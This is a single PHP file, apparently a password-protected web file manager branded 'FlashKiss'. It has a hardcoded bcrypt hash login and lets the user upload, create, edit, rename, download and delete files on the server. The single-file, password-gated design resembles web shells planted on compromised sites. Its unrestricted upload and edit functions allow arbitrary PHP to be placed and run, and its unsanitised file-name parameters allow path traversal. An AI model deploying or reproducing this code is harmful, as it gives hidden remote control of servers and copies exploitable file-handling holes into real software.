<?php
session_start();

$hashed_password = '$2a$12$pT4ZThr8yPs0kdOIUYGiRO2esydgq4xgDB3Q/D5Iy1I.sBiqU.BCS';

if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid password.";
        }
    }

    // Login Form
    echo '<html><head><title>Login</title><style>
        body {
            background-color: #121212; color: #E0E0E0; font-family: Arial;
            display: flex; align-items: center; justify-content: center; height: 100vh;
        }
        form { background: #1f1f1f; padding: 20px; border-radius: 10px; }
        input[type=password], button {
            padding: 10px; border: none; margin-top: 10px; width: 100%;
        }
        input[type=password] {
            background: #222; color: #E0E0E0; border: 1px solid #BB86FC;
        }
        button {
            background: #03DAC6; color: #121212; font-weight: bold;
        }
    </style></head><body>
        <form method="post">
            <h2>🔐 Enter Password</h2>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>';
            if (isset($error)) echo '<p style="color:red;">' . $error . '</p>';
    echo '</form></body></html>';
    exit;
}

// --- FILE MANAGER ---
$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;
if (!$current_dir || strpos($current_dir, $root_dir) !== 0) {
    $current_dir = $root_dir;
}

function listDirectory($dir)
{
    $files = scandir($dir);
    $directories = array();
    $regular_files = array();

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;
            } else {
                $regular_files[] = $file;
            }
        }
    }

    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . htmlspecialchars($directory) . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . htmlspecialchars($file) . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

// Actions
if (isset($_GET['delete'])) {
    $target = $current_dir . '/' . $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
    } elseif (is_dir($target)) {
        rmdir($target);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['download'])) {
    $file = $current_dir . '/' . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

if (isset($_POST['rename_file'])) {
    $old = $current_dir . '/' . $_POST['old_name'];
    $new = $current_dir . '/' . $_POST['new_name'];
    if (file_exists($old)) {
        rename($old, $new);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_POST['save_file'])) {
    $file = $current_dir . '/' . $_POST['file_name'];
    file_put_contents($file, $_POST['file_content']);
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_POST['create_file'])) {
    $file = $current_dir . '/' . $_POST['new_file_name'];
    file_put_contents($file, '');
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>FlashKiss File Manager</title>
    <style>
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>📁 Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>"><?php echo htmlspecialchars($current_dir); ?></a></p>
    
    <div class="form-container">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <?php
    if (isset($_GET['edit'])):
        $file = $current_dir . '/' . $_GET['edit'];
        if (is_file($file)) {
            $content = htmlspecialchars(file_get_contents($file));
            ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                <textarea name="file_content"><?php echo $content; ?></textarea><br>
                <button type="submit" name="save_file">Save</button>
            </form>
        <?php }
    endif; ?>
</body>
</html>
